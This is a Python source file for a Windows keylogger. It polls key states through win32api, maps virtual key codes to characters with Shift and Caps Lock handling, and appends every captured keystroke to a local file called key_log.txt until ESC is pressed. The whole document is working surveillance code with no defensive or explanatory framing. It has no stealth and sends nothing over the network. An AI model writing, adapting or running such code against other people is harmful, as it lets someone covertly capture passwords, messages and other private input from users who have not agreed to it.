import msvcrt
import time
import win32api

# Define virtual key codes for special keys
VK_SHIFT = 0x10
VK_CAPITAL = 0x14

# Map virtual key codes to characters
VK_CODE_TO_CHAR = {
    0x41: 'a', 0x42: 'b', 0x43: 'c', 0x44: 'd', 0x45: 'e', 0x46: 'f',
    0x47: 'g', 0x48: 'h', 0x49: 'i', 0x4A: 'j', 0x4B: 'k', 0x4C: 'l',
    0x4D: 'm', 0x4E: 'n', 0x4F: 'o', 0x50: 'p', 0x51: 'q', 0x52: 'r',
    0x53: 's', 0x54: 't', 0x55: 'u', 0x56: 'v', 0x57: 'w', 0x58: 'x',
    0x59: 'y', 0x5A: 'z', 0x30: '0', 0x31: '1', 0x32: '2', 0x33: '3',
    0x34: '4', 0x35: '5', 0x36: '6', 0x37: '7', 0x38: '8', 0x39: '9',
    0x20: ' ', 0x0D: '\n', 0x08: '[BACKSPACE]'
}

def get_char_from_vk(vk_code):
    char = VK_CODE_TO_CHAR.get(vk_code)
    if char:
        if win32api.GetKeyState(VK_CAPITAL) & 0x0001 or win32api.GetKeyState(VK_SHIFT) < 0:
            return char.upper()
        return char
    return None

# Log keys to a file
def log_key(key):
    with open("key_log.txt", "a") as log_file:
        log_file.write(key)

def main():
    # Initialize a dictionary to store the key states
    key_states = {vk_code: False for vk_code in VK_CODE_TO_CHAR}

    print("Keylogger started. Press ESC to stop.")

    try:
        while True:
            if msvcrt.kbhit():  # Check if a key is pressed
                key = msvcrt.getch()
                if key == b'\x1b':  # ESC key
                    break

            for vk_code in VK_CODE_TO_CHAR:
                if win32api.GetAsyncKeyState(vk_code) & 0x8000:
                    if not key_states[vk_code]:
                        char = get_char_from_vk(vk_code)
                        if char:
                            log_key(char)
                        key_states[vk_code] = True
                else:
                    key_states[vk_code] = False

            time.sleep(0.01)
    except KeyboardInterrupt:
        print("Keylogger stopped.")

if __name__ == "__main__":
    main()
